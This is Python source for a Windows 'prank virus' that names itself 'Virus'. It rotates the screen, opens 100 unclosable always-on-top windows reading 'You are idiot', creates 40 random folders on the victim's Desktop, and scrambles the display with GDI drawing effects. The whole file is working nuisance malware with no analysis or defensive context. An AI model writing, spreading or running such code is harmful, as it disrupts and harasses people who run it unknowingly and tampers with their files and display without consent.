import getpass
import rotatescreen as rs
import os
import threading
from random import *
from tkinter import *
import rand_string.rand_string as rand
from win32con import PATINVERT
from win32gui import *
from win32api import *
from win32file import *


screen = rs.get_primary_display()

screen.rotate_to(90)



def disable_event():
    pass

def move_window():
    root = Tk()
    root.overrideredirect(True)
    root.title("Virus")
    root.attributes('-toolwindow', True)
    x = randint(0, 999)
    y = randint(0, 999)
    root.title("Virus")
    root.geometry(f'235x200+{x}+{y}')
    root.resizable(False, False)
    root.attributes('-topmost', 1)
    root.configure(background='black')
    Label(root, text="Virus", fg='white', font=('Terminal', 13), bg='black').place(x=50, y=20)
    Label(root, text="You are idiot", fg='red', font=('Terminal', 13), bg='black').place(x=20, y=19)
    root.protocol('WM_DELETE_WINDOW', disable_event)
    root.mainloop()

if __name__ == "__main__":
    for i in range(0, 100):
        spam_windows = threading.Thread(target=move_window)
        spam_windows.start()

#SPAM FOLDER
username = getpass.getuser()
try:
    i = 0
    while i < 40:
        x = rand.RandString("alphanumerical", 10)
        y = f"C:\\Users\\{username}\\Desktop\\{x}"
        os.mkdir(y)
        i += 1
except:
    print("ERRO")

desk = GetDC(0)
x = GetSystemMetrics(0)
y = GetSystemMetrics(1)

def tunnel_effect():
    #Screen right
    for w in range(0, 70):
        StretchBlt(desk, 190, -34, x - 100, y - 100, desk, 0, 0, x, y, 0x00cc0012)#0x00cc00
        StretchBlt(desk, randrange(190), -34, randrange(x) - 100, randrange(y) - 100, desk, 0, 0, randrange(x),randrange(y), 0x00cc0012)  # 0x00cc00
    #Screen left
    for w in range(0, 50):
        StretchBlt(desk, -2, 22, x - 22, y - 50, desk, 23, 35, x, y, 0x00cc0095)
    #Screen center
    for w in range(0, 70):
        StretchBlt(desk, 20, 20, x - 30, y - 50, desk, 0, 0, x, y, 0x00cc0122)
        StretchBlt(desk, randrange(190), -34, randrange(x) - 100, randrange(y) - 100, desk, 0, 0, randrange(x),randrange(y), 0x00cc0012)  # 0x00cc00



def patinvert():
    for i in range(0,100):
        brush = CreateSolidBrush(RGB(
            76, 
            0, 
            85  
        ))
        v = PatBlt(desk, -2, 22, x - 22, y - 50, 5898313)
        SelectObject(desk, brush)
        q = PatBlt(desk, randrange(x), randrange(y), randrange(x), randrange(y), 5898313)  # 5898313
        StretchBlt(desk, randrange(190), -34, randrange(x) - 100, randrange(y) - 100, desk, 0, 0, randrange(x),randrange(y), 0x00cc0012)  # 0x00cc00



tunnel_effect()
patinvert()


def effect():
    for i in range(0,100):
        brush = CreateSolidBrush(RGB(
            0,  
            0,  
            255  
        ))
        SelectObject(desk, brush)
        PatBlt(desk, randrange(x), randrange(y),randrange(x), randrange(y),PATINVERT)
        DeleteObject(brush)
    ReleaseDC(desk, GetDesktopWindow())
    DeleteDC(desk)
effect()
